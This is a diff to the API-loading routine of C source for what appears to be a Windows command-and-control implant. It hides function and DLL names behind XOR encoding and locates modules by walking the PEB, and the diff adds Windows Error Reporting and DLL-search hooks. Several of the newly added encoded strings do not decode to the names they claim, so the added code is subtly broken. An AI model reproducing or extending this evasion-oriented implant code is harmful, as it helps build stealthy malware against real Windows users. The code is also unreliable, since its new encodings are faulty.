@@ -247,7 +247,12 @@ void c2t_win32_api_init(void) {
   /* iphlpapi functions */
   static const unsigned char enc_GetAdaptersAddresses[] = {29, 63, 46, 27, 62, 59, 42, 46, 63, 40, 41, 27, 62, 62, 40, 63, 41, 41, 63, 41};
 
-  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32], dll_winhttp[32], dll_iphlpapi[32];
+  /* wer & kernel32 security functions */
+  static const unsigned char enc_SetDefaultDllDirectories[] = {89, 63, 62, 110, 63, 60, 59, 63, 54, 62, 110, 54, 54, 110, 59, 40, 63, 57, 62, 45, 40, 59, 63, 41};
+  static const unsigned char enc_wer_dll[] = {45, 63, 40, 104, 62, 54, 54};
+  static const unsigned char enc_WerSetFlags[] = {85, 63, 40, 89, 63, 62, 124, 54, 59, 61, 41};
+
+  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32], dll_winhttp[32], dll_iphlpapi[32], dll_wer[32];
   c2t_win32_xor_decode(dll_user32, enc_user32_dll, sizeof(enc_user32_dll), 0x5A);
   c2t_win32_xor_decode(dll_kernel32, enc_kernel32_dll, sizeof(enc_kernel32_dll), 0x5A);
   c2t_win32_xor_decode(dll_advapi32, enc_advapi32_dll, sizeof(enc_advapi32_dll), 0x5A);
@@ -255,6 +260,7 @@ void c2t_win32_api_init(void) {
   c2t_win32_xor_decode(dll_shell32, enc_shell32_dll, sizeof(enc_shell32_dll), 0x5A);
   c2t_win32_xor_decode(dll_winhttp, enc_winhttp_dll, sizeof(enc_winhttp_dll), 0x5A);
   c2t_win32_xor_decode(dll_iphlpapi, enc_iphlpapi_dll, sizeof(enc_iphlpapi_dll), 0x5A);
+  c2t_win32_xor_decode(dll_wer, enc_wer_dll, sizeof(enc_wer_dll), 0x5A);
 
   HMODULE hKernel32 = c2t_win32_get_module_peb(L"kernel32.dll");
   if (!hKernel32) hKernel32 = GetModuleHandleA(dll_kernel32);
@@ -283,6 +289,10 @@ void c2t_win32_api_init(void) {
   HMODULE hIphlpapi = c2t_win32_get_module_peb(L"iphlpapi.dll");
   if (!hIphlpapi) hIphlpapi = GetModuleHandleA(dll_iphlpapi);
   if (!hIphlpapi && hKernel32) hIphlpapi = LoadLibraryA(dll_iphlpapi);
+
+  HMODULE hWer = c2t_win32_get_module_peb(L"wer.dll");
+  if (!hWer) hWer = GetModuleHandleA(dll_wer);
+  if (!hWer && hKernel32) hWer = LoadLibraryA(dll_wer);
 
 #define LOAD_API(hMod, field, enc_arr)                                         \
   do {                                                                         \
@@ -402,6 +412,11 @@ void c2t_win32_api_init(void) {
   LOAD_API(hKernel32, InitializeConditionVariable, enc_InitializeConditionVariable);
   LOAD_API(hKernel32, SleepConditionVariableCS, enc_SleepConditionVariableCS);
   LOAD_API(hKernel32, WakeConditionVariable, enc_WakeConditionVariable);
+  LOAD_API(hKernel32, SetDefaultDllDirectories, enc_SetDefaultDllDirectories);
+
+  if (g_c2t_win32.SetDefaultDllDirectories) {
+    g_c2t_win32.SetDefaultDllDirectories(0x00000800U); /* LOAD_LIBRARY_SEARCH_SYSTEM32 */
+  }
 
 
   /* advapi32 */
@@ -432,6 +447,9 @@ void c2t_win32_api_init(void) {
 
   /* iphlpapi */
   LOAD_API(hIphlpapi, GetAdaptersAddresses, enc_GetAdaptersAddresses);
+
+  /* wer */
+  LOAD_API(hWer, WerSetFlags, enc_WerSetFlags);
 
 #undef LOAD_API
 
